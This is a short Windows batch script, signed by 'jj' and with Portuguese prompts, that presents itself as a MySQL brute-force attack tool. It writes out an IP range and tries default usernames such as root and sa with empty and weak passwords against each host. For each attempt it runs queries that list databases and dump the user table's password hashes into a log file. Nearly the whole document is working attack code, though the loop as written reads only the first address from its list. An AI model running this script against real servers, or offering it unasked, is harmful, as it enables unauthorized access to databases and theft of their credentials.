@echo off

echo ##########################################
echo # MySQL - Brute force Atack .bat (by jj) #
echo ##########################################

color 2e
set /p ip= echo "Entre com as 3 primeiras partes do seu Endereco IP[Interno ou Externo] Ex: 192.168.0 : "

for /L %%x in (1,1,254) do (echo %ip%.%%x >> listIPs.txt)

set /p list=<listIPs.txt
set user=root admin SYSDBA sa user 
set pass=admin masterkey 123 1234 12345 123456 456123 123456789 sa toor


echo iniciando...

for %%a in (%list%) do (
 for %%u in (%user%) do (
    echo ####[IP: %%a - USUARIO: %%u - SENHA: vazio ]#### >> log.txt
    call mysql --host=%%a -u %%u --password= -e "show databases;"  >> log.txt
    call mysql --host=%%a -u %%u --password= -e "use mysql;select Host,User,Password from user;quit;"  >> log.txt
  for %%p in (%pass%) do (
    echo ####[IP: %%a - USUARIO: %%u - SENHA: %%p ]#### >> log.txt
    call mysql --host=%%a -u %%u --password=%%p -e "show databases;"  >> log.txt
    call mysql --host=%%a -u %%u --password=%%p -e "use mysql;select Host,User,Password from user;quit;"  >> log.txt

))) 
@echo on
echo fim...
pause





